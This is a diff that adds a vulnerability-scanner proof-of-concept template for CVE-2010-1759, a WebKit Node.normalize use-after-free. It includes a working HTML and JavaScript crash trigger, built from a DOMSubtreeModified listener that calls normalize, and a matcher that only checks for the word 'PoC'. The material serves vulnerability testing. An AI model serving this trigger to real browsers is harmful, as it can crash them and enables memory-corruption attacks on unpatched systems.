@@ -1,0 +1,52 @@
+[info]
+author = "AVE"
+description = "通过 HTTP 服务向目标浏览器发送包含 Node.normalize 触发代码的 HTML 页面，检测 WebKit 是否存在释放后使用漏洞。若目标浏览器崩溃或返回异常状态，则表明存在漏洞。"
+id = "POC-AVE-2010-0170"
+name = "CVE-2010-1759 WebKit Node.normalize Use-After-Free PoC"
+severity = "critical"
+tags = [
+    "cve-2010-1759",
+    "webkit",
+    "use-after-free",
+    "safari",
+    "android",
+]
+vuln_id = [
+    "CVE-2010-1759",
+    "AVE-2010-0170",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2010-1759-poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<head><title>PoC</title></head>
+<body>
+<div id="test1"></div>
+<div id="test2"></div>
+<script>
+var elem1 = document.getElementById("test1");
+var elem2 = document.getElementById("test2");
+elem1.setAttribute("b", "a");
+elem1.attributes[0].appendChild(document.createTextNode("hi"));
+elem1.attributes[0].addEventListener("DOMSubtreeModified", function(){elem2.normalize();}, false);
+document.body.offsetTop;
+elem1.normalize();
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["PoC"]
